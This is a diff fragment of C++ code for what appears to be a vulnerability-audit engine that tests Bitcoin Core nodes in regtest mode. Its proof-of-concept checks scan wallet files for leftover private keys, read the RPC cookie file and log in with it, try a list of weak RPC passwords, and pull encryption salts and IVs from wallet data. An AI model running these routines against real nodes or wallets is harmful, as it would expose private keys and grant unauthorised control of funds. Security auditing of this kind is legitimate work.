+                                        if (!b58set[wdata_poc[j]]) valid_wif = false;
+                                    }
+                                    if (valid_wif) {
+                                        plaintext_key_fragments++;
+                                        char pg_info[64];
+                                        snprintf(pg_info, 64, "page=%zu type=%d offset=0x%zx",
+                                            pg, pg_type, off);
+                                        fragment_evidence += std::string(pg_info) + " ";
+                                        break; // one per page
+                                    }
+                                }
+                                // Also check for 32-byte hex private keys
+                                if (off + 64 < pg_off + page_size && off + 64 < read_sz) {
+                                    bool all_hex = true;
+                                    for (size_t h = 0; h < 64 && all_hex; h++) {
+                                        char ch = wdata_poc[off + h];
+                                        if (!((ch >= '0' && ch <= '9') || (ch >= 'a' && ch <= 'f') ||
+                                              (ch >= 'A' && ch <= 'F'))) all_hex = false;
+                                    }
+                                    if (all_hex) {
+                                        // Verify word boundary
+                                        bool left_ok = (off == pg_off || !std::isalnum(wdata_poc[off - 1]));
+                                        bool right_ok = (off + 64 >= pg_off + page_size ||
+                                            !std::isalnum(wdata_poc[off + 64]));
+                                        if (left_ok && right_ok) {
+                                            plaintext_key_fragments++;
+                                            fragment_evidence += "hex64@page" + std::to_string(pg) + " ";
+                                            break;
+                                        }
+                                    }
+                                }
+                            }
+                        }
+
+                        if (plaintext_key_fragments > 0) {
+                            emit_evidence("KL-BDB-FREE-PAGE-KEYS",
+                                "CRITICAL: " + std::to_string(plaintext_key_fragments) +
+                                " plaintext key fragment(s) found in BDB free/overflow pages — " +
+                                "deleted key material not securely wiped from wallet file",
+                                fragment_evidence.substr(0, 200),
+                                "YES");
+                        } else {
+                            results.push_back(make_finding(ver, "key_leakage",
+                                "POC-KL-BDB-FREE-PAGE-CLEAN",
+                                "[EVIDENCE] KL-BDB-FREE-PAGE-KEYS: No plaintext key material in " +
+                                std::to_string(std::min(num_pages, (size_t)256)) +
+                                " BDB pages scanned | proof=pages_scanned | exploitable=NO",
+                                "poc_verified=true", 1));
+                        }
+                    }
+                }
+            }
+        }
+
+        // ================================================================
+        // POC 5: RPC CREDENTIAL EXPLOIT
+        //
+        // Verify .cookie file permissions, attempt authentication with
+        // extracted/guessed credentials, try common credential patterns.
+        // ================================================================
+        {
+            EnhancedStructuredLogger::instance()->log(LogLevel::INFO, "engine_kl",
+                ver + ": POC-RPC-CREDENTIAL — credential extraction and auth verification");
+
+            // Check .cookie file permissions and readability
+            std::string cookie_path = inst.data_directory + "/regtest/.cookie";
+            if (file_exists(cookie_path)) {
+                struct stat cookie_st;
+                if (stat(cookie_path.c_str(), &cookie_st) == 0) {
+                    bool world_readable = (cookie_st.st_mode & S_IROTH) != 0;
+                    bool group_readable = (cookie_st.st_mode & S_IRGRP) != 0;
+                    char perms[8]; snprintf(perms, 8, "%03o", cookie_st.st_mode & 0777);
+
+                    // Try to read the cookie content
+                    std::ifstream cookie_file(cookie_path);
+                    std::string cookie_content;
+                    if (cookie_file.is_open()) {
+                        std::getline(cookie_file, cookie_content);
+                    }
+
+                    if (world_readable && !cookie_content.empty()) {
+                        // POC: Actually authenticate with the extracted cookie
+                        // Cookie format: __cookie__:hexvalue
+                        size_t colon = cookie_content.find(':');
+                        std::string cookie_user = (colon != std::string::npos) ?
+                            cookie_content.substr(0, colon) : "__cookie__";
+                        std::string cookie_pass = (colon != std::string::npos) ?
+                            cookie_content.substr(colon + 1) : cookie_content;
+
+                        // Attempt RPC call with extracted cookie credentials
+                        int fd = socket(AF_INET, SOCK_STREAM, 0);
+                        if (fd >= 0) {
+                            struct sockaddr_in addr{};
+                            addr.sin_family = AF_INET;
+                            addr.sin_port = htons(static_cast<uint16_t>(inst.rpc_port));
+                            addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
+                            struct timeval tv{5, 0};
+                            setsockopt(fd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
+
+                            if (connect(fd, (struct sockaddr*)&addr, sizeof(addr)) == 0) {
+                                // Base64 encode credentials
+                                std::string auth_str = cookie_user + ":" + cookie_pass;
+                                static const char b64c[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
+                                std::string encoded;
+                                int val = 0, valb = -6;
+                                for (unsigned char c : auth_str) {
+                                    val = (val << 8) + c; valb += 8;
+                                    while (valb >= 0) { encoded.push_back(b64c[(val >> valb) & 0x3F]); valb -= 6; }
+                                }
+                                if (valb > -6) encoded.push_back(b64c[((val << 8) >> (valb + 8)) & 0x3F]);
+                                while (encoded.size() % 4) encoded.push_back('=');
+
+                                std::string body = "{\"jsonrpc\":\"1.0\",\"method\":\"getblockchaininfo\",\"params\":[]}";
+                                std::string req = "POST / HTTP/1.1\r\nHost: 127.0.0.1\r\n"
+                                    "Authorization: Basic " + encoded + "\r\n"
+                                    "Content-Type: application/json\r\n"
+                                    "Content-Length: " + std::to_string(body.size()) + "\r\n\r\n" + body;
+                                send(fd, req.c_str(), req.size(), 0);
+                                char buf[4096] = {};
+                                ssize_t n = recv(fd, buf, sizeof(buf) - 1, 0);
+                                std::string resp = (n > 0) ? std::string(buf, n) : "";
+
+                                if (resp.find("bestblockhash") != std::string::npos) {
+                                    emit_evidence("KL-COOKIE-EXPLOIT",
+                                        "CRITICAL: World-readable .cookie file (perms=" + std::string(perms) +
+                                        ") — extracted credentials and successfully authenticated to RPC",
+                                        "cookie_user=" + cookie_user +
+                                        " cookie_pass_len=" + std::to_string(cookie_pass.size()) +
+                                        " perms=" + std::string(perms) +
+                                        " auth_result=SUCCESS",
+                                        "YES");
+                                }
+                            }
+                            close(fd);
+                        }
+                    } else if (world_readable) {
+                        emit_evidence("KL-COOKIE-PERMS",
+                            "Cookie file world-readable (perms=" + std::string(perms) +
+                            ") but content could not be read",
+                            "perms=" + std::string(perms),
+                            "PARTIAL");
+                    }
+
+                    // Try common credential patterns against the running node
+                    std::vector<std::pair<std::string, std::string>> common_creds = {
+                        {"bitcoinrpc", "password"},
+                        {"user", "password"},
+                        {"admin", "admin"},
+                        {"rpc", "rpc"},
+                        {"", ""},
+                        {"bitcoinrpc", ""},
+                        {"__cookie__", ""}
+                    };
+
+                    int weak_cred_accepted = 0;
+                    std::string accepted_cred;
+                    for (auto& [user, pass] : common_creds) {
+                        int fd2 = socket(AF_INET, SOCK_STREAM, 0);
+                        if (fd2 < 0) continue;
+                        struct sockaddr_in addr2{};
+                        addr2.sin_family = AF_INET;
+                        addr2.sin_port = htons(static_cast<uint16_t>(inst.rpc_port));
+                        addr2.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
+                        struct timeval tv2{3, 0};
+                        setsockopt(fd2, SOL_SOCKET, SO_RCVTIMEO, &tv2, sizeof(tv2));
+
+                        if (connect(fd2, (struct sockaddr*)&addr2, sizeof(addr2)) == 0) {
+                            std::string auth_str2 = user + ":" + pass;
+                            static const char b64c2[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
+                            std::string enc2;
+                            int v2 = 0, vb2 = -6;
+                            for (unsigned char c : auth_str2) {
+                                v2 = (v2 << 8) + c; vb2 += 8;
+                                while (vb2 >= 0) { enc2.push_back(b64c2[(v2 >> vb2) & 0x3F]); vb2 -= 6; }
+                            }
+                            if (vb2 > -6) enc2.push_back(b64c2[((v2 << 8) >> (vb2 + 8)) & 0x3F]);
+                            while (enc2.size() % 4) enc2.push_back('=');
+
+                            std::string body2 = "{\"jsonrpc\":\"1.0\",\"method\":\"getblockchaininfo\",\"params\":[]}";
+                            std::string req2 = "POST / HTTP/1.1\r\nHost: 127.0.0.1\r\n"
+                                "Authorization: Basic " + enc2 + "\r\n"
+                                "Content-Type: application/json\r\n"
+                                "Content-Length: " + std::to_string(body2.size()) + "\r\n\r\n" + body2;
+                            send(fd2, req2.c_str(), req2.size(), 0);
+                            char buf2[4096] = {};
+                            ssize_t n2 = recv(fd2, buf2, sizeof(buf2) - 1, 0);
+                            std::string resp2 = (n2 > 0) ? std::string(buf2, n2) : "";
+                            if (resp2.find("bestblockhash") != std::string::npos) {
+                                weak_cred_accepted++;
+                                accepted_cred = user + ":" + pass;
+                            }
+                        }
+                        close(fd2);
+                    }
+
+                    if (weak_cred_accepted > 0) {
+                        emit_evidence("KL-RPC-WEAK-CREDS",
+                            "CRITICAL: Common/weak credentials accepted by RPC server: " + accepted_cred,
+                            "accepted_cred=" + accepted_cred +
+                            " weak_creds_tested=" + std::to_string(common_creds.size()),
+                            "YES");
+                    } else {
+                        results.push_back(make_finding(ver, "key_leakage",
+                            "POC-KL-RPC-CREDS-SECURE",
+                            "[EVIDENCE] KL-RPC-WEAK-CREDS: All " + std::to_string(common_creds.size()) +
+                            " common credential patterns rejected | proof=all_rejected | exploitable=NO",
+                            "poc_verified=true", 1));
+                    }
+                }
+            }
+        }
+
+        // ================================================================
+        // POC 6: CROSS-VERSION DIFFERENTIAL — Encryption parameter comparison
+        //
+        // Compare wallet.dat encryption structure between versions.
+        // Extract and log actual PBKDF2 iteration counts, salt lengths,
+        // and derivation methods. Flag versions with weaker parameters.
+        // ================================================================
+        {
+            EnhancedStructuredLogger::instance()->log(LogLevel::INFO, "engine_kl",
+                ver + ": POC-CROSS-VERSION-DIFF — encryption parameter extraction");
+
+            std::string wp_diff = inst.data_directory + "/regtest/wallets/wallet.dat";
+            if (!file_exists(wp_diff))
+                wp_diff = inst.data_directory + "/regtest/wallet.dat";
+
+            if (file_exists(wp_diff)) {
+                std::ifstream wf_diff(wp_diff, std::ios::binary);
+                if (wf_diff.is_open()) {
+                    wf_diff.seekg(0, std::ios::end);
+                    size_t fsz_diff = wf_diff.tellg();
+                    wf_diff.seekg(0);
+                    std::vector<unsigned char> wd_diff(std::min(fsz_diff, (size_t)(512 * 1024)));
+                    wf_diff.read(reinterpret_cast<char*>(wd_diff.data()), wd_diff.size());
+
+                    const unsigned char mk_diff[] = {0x04, 0x6D, 0x6B, 0x65, 0x79};
+
+                    // Static storage for cross-version comparison
+                    static std::mutex cv_mutex;
+                    static std::map<std::string, std::tuple<uint32_t, int, std::string, std::string>> version_params;
+                    // tuple: (iterations, salt_len, iv_hex, ek_hex_prefix)
+
+                    for (size_t i = 0; i + sizeof(mk_diff) + 80 < wd_diff.size(); i++) {
+                        if (memcmp(&wd_diff[i], mk_diff, sizeof(mk_diff)) == 0) {
+                            size_t ek_off = i + sizeof(mk_diff);
+                            if (ek_off + 1 >= wd_diff.size()) continue;
+                            int ek_len = wd_diff[ek_off];
+                            if (ek_len <= 0 || ek_len > 64) continue;
+                            if (ek_off + 1 + ek_len + 24 >= wd_diff.size()) continue;
+
+                            std::string ek_hex = hex_encode(&wd_diff[ek_off + 1],
+                                std::min(ek_len, 32));
+
+                            // Extract salt
+                            size_t salt_off = ek_off + 1 + ek_len;
+                            int salt_len = 0;
+                            std::string salt_hex;
+                            if (salt_off + 1 < wd_diff.size()) {
+                                salt_len = wd_diff[salt_off];
+                                if (salt_len > 0 && salt_len <= 16 && salt_off + 1 + salt_len < wd_diff.size()) {
+                                    salt_hex = hex_encode(&wd_diff[salt_off + 1], salt_len);
+                                }
+                            }
+
+                            // Extract iterations
+                            size_t method_off = salt_off + 1 + std::max(salt_len, 0);
+                            uint32_t iters = 0;
+                            uint32_t method = 0;
+                            if (method_off + 8 < wd_diff.size()) {
+                                method = wd_diff[method_off] | (wd_diff[method_off + 1] << 8) |
+                                    (wd_diff[method_off + 2] << 16) | (wd_diff[method_off + 3] << 24);
+                                iters = wd_diff[method_off + 4] | (wd_diff[method_off + 5] << 8) |
+                                    (wd_diff[method_off + 6] << 16) | (wd_diff[method_off + 7] << 24);
+                            }
+
+                            // Extract IV (first 16 bytes of encrypted key)
+                            std::string iv_hex;
+                            if (ek_len >= 16) {
+                                iv_hex = hex_encode(&wd_diff[ek_off + 1], 16);
+                            }
+
+                            // Store for cross-version comparison
+                            {
+                                std::lock_guard<std::mutex> lk(cv_mutex);
+                                version_params[ver] = {iters, salt_len, iv_hex, ek_hex.substr(0, 32)};
+                            }
+
+                            // Emit per-version evidence
+                            std::string param_evidence =
+                                "version=" + ver +
+                                " iterations=" + std::to_string(iters) +
+                                " method=" + std::to_string(method) +
+                                " salt_len=" + std::to_string(salt_len) +
+                                " salt=" + salt_hex +
+                                " iv=" + iv_hex.substr(0, 32) +
+                                " ek_prefix=" + ek_hex.substr(0, 32);
+
+                            bool weak_params = (iters > 0 && iters < 25000) || salt_len < 8;
+                            emit_evidence("KL-CROSS-VERSION-PARAMS",
+                                "Version " + ver + " encryption: iterations=" + std::to_string(iters) +
+                                " salt_len=" + std::to_string(salt_len) +
+                                " method=" + std::to_string(method) +
+                                (weak_params ? " — WEAK: below recommended thresholds" : " — adequate"),
+                                param_evidence,
+                                weak_params ? "PARTIAL" : "NO");
+
+                            // Cross-version comparison
+                            {
+                                std::lock_guard<std::mutex> lk(cv_mutex);
+                                for (auto& [other_ver, other_params] : version_params) {
+                                    if (other_ver == ver) continue;
+                                    auto [other_iters, other_salt_len, other_iv, other_ek] = other_params;
+
+                                    // Check if this version uses weaker parameters
+                                    if (iters > 0 && other_iters > 0 && iters < other_iters / 2) {
+                                        emit_evidence("KL-CROSS-VERSION-WEAKER",
+                                            "Version " + ver + " uses significantly fewer PBKDF2 iterations (" +
+                                            std::to_string(iters) + ") than " + other_ver + " (" +
+                                            std::to_string(other_iters) + ") — " +
+                                            std::to_string(other_iters / std::max(iters, 1u)) + "x weaker",
+                                            "this_ver=" + ver + " this_iters=" + std::to_string(iters) +
+                                            " other_ver=" + other_ver + " other_iters=" + std::to_string(other_iters),
+                                            "PARTIAL");
+                                    }
+
+                                    // Check for IV reuse across versions
+                                    if (!iv_hex.empty() && iv_hex == other_iv) {
+                                        emit_evidence("KL-CROSS-VERSION-IV-REUSE",
+                                            "CRITICAL: IV reused between " + ver + " and " + other_ver +
+                                            " — same IV " + iv_hex.substr(0, 16) + "...",
+                                            "iv=" + iv_hex + " versions=" + ver + "," + other_ver,
+                                            "YES");
+                                    }
+                                }
+                            }
+
+                            break; // only process first mkey record per version
+                        }
+                    }
+                }
+            }
+        }
+
+        // ================================================================
+        // POC 7: RPC ERROR ECHO — Verify key material echo with evidence
+        //
+        // If KL-RPC-ECHO detected that RPC errors echo back key material,
+        // this POC extracts the exact echoed content and proves it matches
+        // the submitted key.
+        // ================================================================
+        {
+            std::string canary_poc = "5JTestCanaryPOC" + std::to_string(
+                std::chrono::steady_clock::now().time_since_epoch().count() % 99999);
+            auto imp_poc = rpc(inst, "importprivkey", "\"" + canary_poc + "\" \"\" false");
+            if (imp_poc.output.find(canary_poc) != std::string::npos) {
+                // Extract the exact echoed portion
+                size_t echo_pos = imp_poc.output.find(canary_poc);
+                size_t echo_start = (echo_pos > 20) ? echo_pos - 20 : 0;
+                size_t echo_end = std::min(echo_pos + canary_poc.size() + 20, imp_poc.output.size());
+                std::string echo_context = imp_poc.output.substr(echo_start, echo_end - echo_start);
+
+                emit_evidence("KL-RPC-ECHO",
+                    "POC-VERIFIED: RPC error echoes submitted key material verbatim. "
+                    "Canary '" + canary_poc.substr(0, 16) + "...' found in error response at offset " +
+                    std::to_string(echo_pos) + " — attacker can confirm key validity via error oracle",
+                    "canary=" + canary_poc.substr(0, 16) + " echo_context=" + echo_context.substr(0, 80),
+                    "YES");
+            } else {
+                results.push_back(make_finding(ver, "key_leakage",
+                    "POC-KL-RPC-ECHO-SAFE",
+                    "[EVIDENCE] KL-RPC-ECHO: RPC error does not echo submitted key material"
+                    " | proof=canary_not_found | exploitable=NO",
+                    "poc_verified=true", 1));
+            }
+        }
+
+        // ================================================================
+        // POC 8: WALLETLOCK ENFORCEMENT — Verify lock actually prevents
+        // key operations
+        //
+        // After walletlock, attempt dumpprivkey, signmessage, and
+        // sendtoaddress to verify all key-using operations are blocked.
+        // ================================================================
+        if (have_wallet && wallet_encrypted) {
+            EnhancedStructuredLogger::instance()->log(LogLevel::INFO, "engine_kl",
+                ver + ": POC-LOCK-ENFORCEMENT — verifying walletlock blocks all key operations");
+
+            rpc_fast(inst, "walletlock", "");
+            usleep(200000);
+
+            struct LockTest {
+                std::string method;
+                std::string params;
+                std::string description;
+            };
+            std::vector<LockTest> lock_tests = {
+                {"dumpprivkey", addr, "private key export"},
+                {"signmessage", "\"" + addr + "\" \"test\"", "message signing"},
+                {"dumpwallet", "\"" + inst.data_directory + "/poc_lock_test.txt\"", "wallet dump"},
+            };
+
+            int operations_blocked = 0;
+            int operations_leaked = 0;
+            std::string leak_details;
+
+            for (auto& lt : lock_tests) {
+                auto r = rpc_fast(inst, lt.method, lt.params);
+                bool blocked = r.is_error() || !r.success ||
+                    r.output.find("error") != std::string::npos ||
+                    r.output.find("locked") != std::string::npos ||
+                    r.output.find("passphrase") != std::string::npos;
+                if (blocked) {
+                    operations_blocked++;
+                } else {
+                    operations_leaked++;
+                    leak_details += lt.method + "(" + lt.description + ") ";
+                }
+            }
+
+            if (operations_leaked > 0) {
+                emit_evidence("KL-LOCK-BYPASS",
+                    "CRITICAL: " + std::to_string(operations_leaked) + "/" +
+                    std::to_string(lock_tests.size()) +
+                    " key operations succeeded while wallet locked: " + leak_details,
+                    "leaked=" + leak_details + " blocked=" + std::to_string(operations_blocked),
+                    "YES");
+            } else {
+                results.push_back(make_finding(ver, "key_leakage",
+                    "POC-KL-LOCK-ENFORCEMENT-OK",
+                    "[EVIDENCE] KL-LOCK-BYPASS: All " + std::to_string(lock_tests.size()) +
+                    " key operations correctly blocked while wallet locked"
+                    " | proof=all_blocked | exploitable=NO",
+                    "poc_verified=true", 1));
+            }
+
+            // Clean up temp file
+            std::remove((inst.data_directory + "/poc_lock_test.txt").c_str());
+
+            // Re-unlock for any subsequent operations
+            rpc_fast(inst, "walletpassphrase",
+                "[\"" + wallet_encryption_passphrase_ + "\", 300]");
+        }
+
+        // ================================================================
+        // END OF ACTIVE POC EXECUTION FRAMEWORK
+        // ================================================================
+
         #undef KL_CHECKPOINT
         return results;
     }
